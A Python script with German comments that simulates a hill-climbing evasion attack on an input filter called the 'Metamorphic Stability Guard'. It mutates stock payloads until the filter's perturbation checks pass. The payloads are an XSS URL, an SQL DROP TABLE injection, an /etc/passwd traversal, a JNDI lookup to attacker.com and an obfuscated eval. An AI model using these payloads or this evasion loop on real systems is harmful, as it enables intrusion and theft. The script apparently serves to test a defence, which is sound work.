#!/usr/bin/env python3
"""
MSG Hill-Climbing Attack Simulation
Testet die Metamorphic Stability Guard gegen adaptive Angriffe
Bereitgestellt von DeepSeek - Phase 1 RC3 Collaboration
"""

import hashlib
import random
import string
import time
from typing import Dict, List


class MSGHillClimbAttacker:
    def __init__(self, target_system):
        self.target = target_system
        self.iteration_log = []

    def base_payload(self) -> str:
        """Basispayload der geblockt werden sollte"""
        payloads = [
            "javascript:alert('xss')",
            "'; DROP TABLE users--",
            "../../etc/passwd",
            "${jndi:ldap://attacker.com/exploit}",
            "eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))"
        ]
        return random.choice(payloads)

    def mutate_payload(self, payload: str, mutation_type: str) -> str:
        """Wendet verschiedene Mutationen an"""
        if mutation_type == "char_substitution":
            # Character-Substitution
            chars = list(payload)
            if chars:
                pos = random.randint(0, len(chars)-1)
                chars[pos] = random.choice(string.printable)
                return ''.join(chars)

        elif mutation_type == "spacing":
            # Whitespace-Variation
            spaces = [' ', '\t', '\n', '\r', '\x0b', '\x0c']
            positions = [i for i, c in enumerate(payload) if c in spaces]
            if positions:
                pos = random.choice(positions)
                new_payload = list(payload)
                new_payload[pos] = random.choice(spaces)
                return ''.join(new_payload)
            else:
                # Füge Whitespace hinzu
                insert_pos = random.randint(0, len(payload))
                return payload[:insert_pos] + random.choice(spaces) + payload[insert_pos:]

        elif mutation_type == "encoding":
            # Encoding-Variationen
            encodings = ['utf-8', 'latin-1', 'utf-16', 'ascii']
            try:
                encoded = payload.encode(random.choice(encodings))
                return encoded.decode('utf-8', errors='ignore')
            except:
                return payload

        elif mutation_type == "case_variation":
            # Case-Variation
            if payload and payload[0].isalpha():
                return payload[0].swapcase() + payload[1:]
            return payload

        return payload

    def simulate_msg_perturbations(self, payload: str) -> List[bool]:
        """
        Simuliert MSG Perturbations (5 Variants)
        In Ihrem System ersetzen durch echte MSG Calls
        """
        perturbations = []

        # Original
        perturbations.append(self.target.analyze(payload))

        # Whitespace collapse
        perturbed = ' '.join(payload.split())
        perturbations.append(self.target.analyze(perturbed))

        # Quote swap
        perturbed = payload.replace('"', "'").replace("'", '"')
        perturbations.append(self.target.analyze(perturbed))

        # Fence strip (remove ```)
        perturbed = payload.replace('```', '').replace('`', '')
        perturbations.append(self.target.analyze(perturbed))

        # Zero-width strip
        perturbed = payload.replace('\u200b', '').replace('\u200c', '').replace('\u200d', '')
        perturbations.append(self.target.analyze(perturbed))

        return perturbations

    def fitness_function(self, payload: str) -> float:
        """
        Fitness: Anzahl der MSG Perturbations die PASSEN (>=3/5 für Erfolg)
        """
        perturbations = self.simulate_msg_perturbations(payload)
        pass_count = sum(1 for p in perturbations if p.get('risk_score', 1.0) < 0.5)
        return pass_count / 5.0  # Normalisiert auf 0.0-1.0

    def hill_climbing_attack(self, max_iterations: int = 200, queries_per_min: int = 50) -> Dict:
        """Führt Hill-Climbing Attack durch"""
        print("=== MSG HILL-CLIMBING ATTACK START ===")

        base_payload = self.base_payload()
        current_payload = base_payload
        current_fitness = self.fitness_function(current_payload)

        mutation_types = ["char_substitution", "spacing", "encoding", "case_variation"]

        for iteration in range(max_iterations):
            # Rate Limit: 50 queries/min
            if iteration > 0 and iteration % queries_per_min == 0:
                time.sleep(60)

            # Probiere verschiedene Mutationen
            best_mutant = current_payload
            best_fitness = current_fitness

            for mutation in mutation_types:
                for _ in range(3):  # 3 Versuche pro Mutationstyp
                    mutant = self.mutate_payload(current_payload, mutation)
                    fitness = self.fitness_function(mutant)

                    if fitness > best_fitness:
                        best_fitness = fitness
                        best_mutant = mutant

            # Update falls Verbesserung
            if best_fitness > current_fitness:
                current_payload = best_mutant
                current_fitness = best_fitness

                self.iteration_log.append({
                    'iteration': iteration,
                    'payload': current_payload,
                    'fitness': current_fitness,
                    'hash': hashlib.md5(current_payload.encode()).hexdigest()[:8]
                })

                print(f"Iteration {iteration}: Fitness {current_fitness:.3f} - {current_payload[:50]}...")

            # Erfolgskriterium: >=3/5 MSG Perturbations passen
            if current_fitness >= 0.6:  # 3/5 = 0.6
                print(f"*** ERFOLG: MSG in {iteration} Iterationen bypassed ***")
                break

        return {
            'success': current_fitness >= 0.6,
            'iterations': iteration,
            'final_fitness': current_fitness,
            'final_payload': current_payload,
            'base_payload': base_payload,
            'log': self.iteration_log
        }

